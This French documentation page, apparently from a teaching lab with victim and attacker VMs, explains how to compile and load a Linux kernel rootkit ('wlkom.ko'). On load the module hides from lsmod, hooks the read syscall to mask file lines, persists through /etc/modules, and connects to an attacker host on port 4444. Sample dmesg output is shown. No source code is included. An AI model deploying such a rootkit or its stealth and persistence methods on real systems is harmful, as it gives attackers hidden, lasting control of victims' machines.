# Compiler et charger le rootkit

Le rootkit est un **module kernel Linux** (`wlkom.ko`) qui se charge dans le noyau de la VM victime, se dissimule, installe sa persistance, et établit une connexion TCP vers le programme attaquant.

---

## En résumé

Depuis la VM victime (`victim` / `victim`), exécutez ces trois commandes :

```bash
cd /home/victim/rootkit
make module
sudo insmod wlkom.ko
```

C'est tout. Le module se charge, se cache, installe sa persistance au redémarrage, et se connecte automatiquement au programme attaquant.

---

## Compilation

La compilation doit être effectuée **sur la VM victime** (Ubuntu Focal), car le module doit être compilé pour le noyau en cours d'exécution.

```bash
cd /home/victim/rootkit
make module
```

Cela produit le fichier `wlkom.ko` dans le répertoire courant.

!!! note "Prérequis sur la VM victime"
`gcc` et `make` sont installés automatiquement par le script de démarrage. Les headers du noyau (`linux-headers-$(uname -r)`) doivent également être présents : Ubuntu Focal les fournit dans l'image cloud.

---

## Chargement

```bash
sudo insmod wlkom.ko
```

Au chargement, le module effectue automatiquement dans l'ordre :

1. **Se cache** de `lsmod` et `/proc/modules` (`wlkom_hide_module()`)
2. **Installe le hook syscall** pour masquer les lignes de fichier (`wlkom_syscall_hook_init()`) : masque automatiquement `wlkom` dans `/etc/modules`
3. **Installe sa persistance** (`wlkom_persist()`) : copie dans `/lib/modules/`, ajout à `/etc/modules`, `depmod`
4. **Démarre le thread de connexion** vers `192.168.50.1:4444`

!!! warning "lsmod ne montrera rien"
Le module se cache immédiatement au chargement. `lsmod | grep wlkom` ne retournera rien même si le module fonctionne. Utilisez `dmesg` pour vérifier.

Pour vérifier que le module est chargé et que la connexion est en cours :

```bash
dmesg | grep wlkom
```

Vous devriez voir :

```
wlkom: module loaded
wlkom: -- INSIDE HIDE --
wlkom_log: module should be hidden
wlkom: installing persistence from /home/victim/rootkit/wlkom.ko
wlkom: persistence installed
wlkom_log: trying to connect to 192.168.50.1:4444
wlkom_log: connected
wlkom_log: connection thread started
```

!!! tip "Pas de connexion ?"
Si vous voyez `wlkom_log: connection failed` en boucle, vérifiez que le programme attaquant est bien lancé sur la VM attaquante avec la commande `rootkit`.

---

## Déchargement manuel

```bash
sudo rmmod wlkom
```

!!! warning "Impossible si le module est caché"
Le module se cachant au chargement, `rmmod wlkom` échoue car il n'apparaît plus dans la liste des modules. De plus, le module étant persistant, un simple redémarrage ne suffit pas : il se rechargera automatiquement.

    Pour repartir d'une VM propre, utilisez `make reset` dans `vms/victim/` **depuis la machine hôte** :

    ```bash
    make -C vms/victim reset
    ```

    Cela détruit et recrée la VM depuis zéro. Recompilez ensuite le module et rechargez-le avec `insmod`.

---

## Structure du module

| Fichier                           | Rôle                                                      |
| :-------------------------------- | :-------------------------------------------------------- |
| `src/wlkom.c`                     | Point d'entrée (`init` / `exit`), orchestre le chargement |
| `src/connection.c`                | TCP : connexion, session, protocole, commandes            |
| `src/persistence.c`               | Auto-installation au démarrage via `call_usermodehelper`  |
| `src/hide-rootkit/hide_rootkit.c` | Retrait de la liste des modules (`lsmod`)                 |
| `src/hide-rootkit/syscall_hook.c` | Hook ftrace sur `read` pour masquer des lignes de fichier |
